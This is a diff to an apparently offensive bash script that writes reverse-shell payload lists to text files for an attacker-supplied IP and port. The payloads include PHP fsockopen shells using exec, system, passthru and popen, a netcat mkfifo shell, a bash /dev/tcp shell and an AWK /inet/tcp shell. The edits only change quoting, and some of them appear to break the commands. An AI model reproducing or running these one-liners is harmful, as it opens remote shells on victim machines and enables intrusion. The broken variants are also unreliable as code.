@@ -131,12 +131,12 @@ if [[ $input == "1" ]]; then ## Linux
         mkdir Payload_List/PHP/Meterpreter_Binaries/Stageless 2>/dev/null
             echo -e "\n_____________________________________________________" > Payload_List/PHP/Shell_list.txt
             echo "[*] Simple PHP Shell:" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);exec("/bin/sh -i <&3 >&3 2>&3");'" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);shell_exec("/bin/sh -i <&3 >&3 2>&3");'" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);`/bin/sh -i <&3 >&3 2>&3`;'" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);system("/bin/sh -i <&3 >&3 2>&3");'" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);passthru("/bin/sh -i <&3 >&3 2>&3");'" >> Payload_List/PHP/Shell_list.txt
-            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);popen("/bin/sh -i <&3 >&3 2>&3", "r");'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);exec('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);shell_exec('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);'/bin/sh -i <&3 >&3 2>&3';'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);system('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);passthru('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
+            echo -e "php -r '"$sock"=fsockopen("$IP",$PO);popen('/bin/sh -i <&3 >&3 2>&3', 'r');'" >> Payload_List/PHP/Shell_list.txt
             echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PO >/tmp/f'); ?>" >> Payload_List/PHP/Shell_list.txt
             echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'$IP'/'$PO' 0>&1'");?>" >> Payload_List/PHP/Shell_list.txt
             echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
@@ -190,7 +190,7 @@ if [[ $input == "1" ]]; then ## Linux
         mkdir Payload_List/AWK 2>/dev/null
             echo -e "\n_____________________________________________________" > Payload_List/AWK/Shell_list.txt
             echo "[*] Simple AWK Shell:" >> Payload_List/AWK/Shell_list.txt
-            echo -e "awk 'BEGIN {s = '/inet/tcp/0/$IP/$PO'; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null" >> Payload_List/AWK/Shell_list.txt
+            echo -e "awk 'BEGIN {s = '/inet/tcp/0/$IP/$PO'; while(42) { do{ printf 'shell>' |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != 'exit') close(s); }}' /dev/null" >> Payload_List/AWK/Shell_list.txt
             echo -e "\n${RED}Done, Read Payload_List/AWK/Shell_list.txt${XX}"
     elif [[ $plat == "11" ]]; then
         echo -e "\n${BLUE}[+] Golang:${XX}"
